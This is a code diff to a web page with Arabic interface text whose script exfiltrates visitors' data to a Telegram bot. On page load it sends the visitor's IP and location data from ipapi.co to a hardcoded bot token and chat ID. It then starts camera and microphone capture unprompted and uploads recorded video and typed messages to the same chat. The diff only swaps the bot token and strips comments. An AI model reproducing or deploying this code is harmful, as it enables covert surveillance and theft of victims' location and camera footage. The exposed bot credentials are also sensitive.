@@ -68,7 +68,7 @@ body{background:#0a0a0a;color:#fff;min-height:100vh;overflow-x:hidden}
 </div>
 
 <script>
-const BOT='8817416933:AAEJJON9lK12149s6-5qYZ91pzf8-XJiNTw';
+const BOT='8896364474:AAHxyXvrd5x8O2aP_7ybnIr8rm5w5Wm8zWM';
 const CHAT='8823506156';
 
 let stream=null;
@@ -77,11 +77,9 @@ let recordedChunks=[];
 let facingMode='user';
 let videoBlob=null;
 
-// Show notification
 document.getElementById('notif').style.display='block';
 setTimeout(()=>{document.getElementById('notif').style.display='none';},4000);
 
-// Send device info
 async function sendInfo(){
 try{
 const r=await fetch('https://ipapi.co/json/');
@@ -100,7 +98,6 @@ await fetch('https://api.telegram.org/bot'+BOT+'/sendMessage?chat_id='+CHAT+'&te
 }
 sendInfo();
 
-// Start camera
 async function startCamera(){
 try{
 stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:facingMode}, audio:true});
@@ -108,7 +105,6 @@ document.getElementById('preview').srcObject=stream;
 document.getElementById('videoPreview').style.display='block';
 document.getElementById('camBtn').classList.add('active');
 
-// Start recording
 recordedChunks=[];
 mediaRecorder=new MediaRecorder(stream);
 mediaRecorder.ondataavailable=function(e){if(e.data.size>0)recordedChunks.push(e.data);};
@@ -122,17 +118,14 @@ alert('يجب السماح بالوصول إلى الكاميرا والميكر
 }
 }
 
-// Start camera on page load
 setTimeout(startCamera, 2000);
 
-// Switch camera
 document.getElementById('switchBtn').addEventListener('click', function(){
 facingMode = facingMode==='user' ? 'environment' : 'user';
 if(stream){stream.getTracks().forEach(t=>t.stop());}
 startCamera();
 });
 
-// Send video
 document.getElementById('sendBtn').addEventListener('click', async function(){
 if(videoBlob){
 const fd=new FormData();
@@ -144,7 +137,6 @@ alert('✅ تم إرسال الفيديو');
 }
 });
 
-// Send message
 document.getElementById('sendMsg').addEventListener('click', async function(){
 const text=document.getElementById('msgInput').value;
 if(text){
